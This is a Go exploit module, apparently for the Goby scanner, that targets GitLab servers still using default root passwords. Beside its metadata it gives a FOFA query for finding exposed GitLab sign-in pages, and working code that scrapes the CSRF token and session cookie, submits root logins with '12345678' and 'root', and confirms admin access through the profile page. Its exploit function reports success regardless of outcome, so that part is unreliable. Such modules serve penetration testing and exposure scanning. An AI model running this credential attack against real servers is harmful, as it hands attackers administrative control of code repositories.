package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	url2 "net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GitLab /users/sign_in Default Password Vulnerability",
    "Description": "<p>GitLab is an open source project for warehouse management systems, using Git as a code management tool and building a web service on top of it. To install it, refer to GitLab's wiki page on GitHub. Gitlab is a widely used git-based open source code management platform, built on Ruby on Rails, mainly for the management of code and documents generated in the software development process, Gitlab is mainly for code and document management in two dimensions: group and project, where group is a group, project is an engineering project, and a group can manage multiple projects. It can be understood that there are multiple software development tasks in a group, and a project may contain multiple branches, which means that each project has multiple branches, and the branches are independent of each other, and different branches can be merged</p>",
    "Product": "GitLab",
    "Homepage": "https://about.gitlab.com/",
    "DisclosureDate": "2024-09-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"Sign in · GitLab\" && body=\"GitLab\"",
    "GobyQuery": "title=\"Sign in · GitLab\" && body=\"GitLab\"",
    "Level": "1",
    "Impact": "<p>An attacker can use the default password vulnerability to control the entire platform and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://wenku.csdn.net/answer/b8209c2d02e04017a0d730c1f922808b"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "info",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/users/sign_in",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "authenticity_token=xYL1IhYcgD9lwuejaD1Uz4%2FDzYQ8791Ziyyqpk8k8ec%2B4PFDuliOl4iotUPVw2m3TParcC91sSgmb%2FC8tlFzNA%3D%3D&user%5Blogin%5D=root&user%5Bpassword%5D=12345678&user%5Bremember_me%5D=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/users/sign_in",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "authenticity_token=xYL1IhYcgD9lwuejaD1Uz4%2FDzYQ8791Ziyyqpk8k8ec%2B4PFDuliOl4iotUPVw2m3TParcC91sSgmb%2FC8tlFzNA%3D%3D&user%5Blogin%5D=root&user%5Bpassword%5D=12345678&user%5Bremember_me%5D=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "404",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "GitLab /users/sign_in 默认口令漏洞",
            "Product": "GitLab",
            "Description": "<p>GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的Web服务。安装方法是参考GitLab在GitHub上的Wiki页面。Gitlab是被广泛使用的基于git的开源代码管理平台, 基于Ruby on Rails构建, 主要针对软件开发过程中产生的代码和文档进行管理, Gitlab主要针对group和project两个维度进行代码和文档管理, 其中group是群组, project是工程项目, 一个group可以管理多个project, 可以理解为一个群组中有多项软件开发任务, 而一个project中可能包含多个branch, 意为每个项目中有多个分支, 分支间相互独立, 不同分支可以进行归并<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "GitLab /users/sign_in Default Password Vulnerability",
            "Product": "GitLab",
            "Description": "<p>GitLab is an open source project for warehouse management systems, using Git as a code management tool and building a web service on top of it. To install it, refer to GitLab's wiki page on GitHub. Gitlab is a widely used git-based open source code management platform, built on Ruby on Rails, mainly for the management of code and documents generated in the software development process, Gitlab is mainly for code and document management in two dimensions: group and project, where group is a group, project is an engineering project, and a group can manage multiple projects. It can be understood that there are multiple software development tasks in a group, and a project may contain multiple branches, which means that each project has multiple branches, and the branches are independent of each other, and different branches can be merged<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>An attacker can use the default password vulnerability to control the entire platform and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-10-24",
    "Variables": {},
    "PocId": "9962"
}`
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl, pwdInfoList []string) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/users/sign_in`
		vulInfo := ``
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			getRequest := httpclient.NewGetRequestConfig(url)
			getRequest.Timeout = 60
			getRequest.VerifyTls = false
			getRequest.FollowRedirect = false
			for headName, headValue := range head {
				getRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, getRequest)
		}

		header := map[string]string{
			"Cache-Control":   "max-age=0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Accept-Encoding": " gzip, deflate",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		}

		resp, err := setGetRequest(hostInfo, vulPath, header)
		if err != nil || resp.StatusCode != 200 {
			return false, vulInfo, vulPath
		}
		regex := regexp.MustCompile(`meta\s+name="csrf-token"\s+content="([^"]+)"`)
		match := regex.FindStringSubmatch(resp.RawBody)
		var token string
		if len(match) > 1 {
			token = match[1]
		} else {
			return false, vulInfo, vulPath
		}
		regex2 := regexp.MustCompile(`(?i)set-cookie:\s*_gitlab_session=([a-f0-9]+);`)
		s := fmt.Sprintf("%v", resp.HeaderString)
		match2 := regex2.FindStringSubmatch(s)
		var cookie string
		if len(match2) > 1 {
			cookie = match2[1]
		} else {
			return false, vulInfo, vulPath
		}

		for _, pwdInfo := range pwdInfoList {
			postRequest := httpclient.NewPostRequestConfig(vulPath)
			postRequest.Timeout = 60
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range header {
				postRequest.Header.Store(headName, headValue)
			}
			postRequest.Header.Store("Cookie", "_gitlab_session="+cookie)
			postRequest.Data = "authenticity_token=" + url2.QueryEscape(token) + "&user%5Blogin%5D=root&user%5Bpassword%5D=" + pwdInfo + "&user%5Bremember_me%5D=0"
			//请求
			response, err := httpclient.DoHttpRequest(hostInfo, postRequest)
			if err != nil {
				return false, vulInfo, vulPath
			}

			// 获取到session的值
			re := regexp.MustCompile(`known_sign_in=([^;]+);|_gitlab_session=([^;]+);`)
			// 查找匹配项
			s = fmt.Sprintf("%v", response.HeaderString)

			// 找到所有匹配项
			matches := re.FindAllStringSubmatch(s, -1)

			// 提取和拼接结果
			var knownSignIn, gitlabSession string
			for _, match := range matches {
				if match[1] != "" {
					knownSignIn = match[1]
				} else if match[2] != "" {
					gitlabSession = match[2]
				}
			}
			getRequest := httpclient.NewGetRequestConfig("/-/profile")
			getRequest.Timeout = 60
			getRequest.VerifyTls = false
			getRequest.FollowRedirect = false
			for headName, headValue := range header {
				getRequest.Header.Store(headName, headValue)
			}
			getRequest.Header.Store("Cookie", "known_sign_in="+knownSignIn+";"+"_gitlab_session="+gitlabSession)
			//第三次发包
			response, err = httpclient.DoHttpRequest(hostInfo, getRequest)
			if err != nil {
				return false, vulInfo, vulPath
			}
			if strings.Contains(response.RawBody, "Upload new avatar") {
				vulInfo = "root" + "@" + pwdInfo
				return true, vulInfo, vulPath
			}
			//if strings.Contains(response.RawBody, "GitLab") {
			//	vulInfo = "root" + "@" + pwdInfo
			//	return true, vulInfo, vulPath
			//}
		}
		return false, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			pwdInfoList := []string{`12345678`, `root`}
			respBool, vulInfo, _ := sendPayloadyp2Vnbp5(hostInfo, pwdInfoList)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + ":" + hostInfo.HostInfo + "/users/sign_in"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			defaultModeMap := map[string][]string{
				"default": {"12345678", "root"},
			}
			mode := goutils.B2S(ss.Params["info"])
			pwdInfoList := defaultModeMap[mode]
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo, pwdInfoList)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
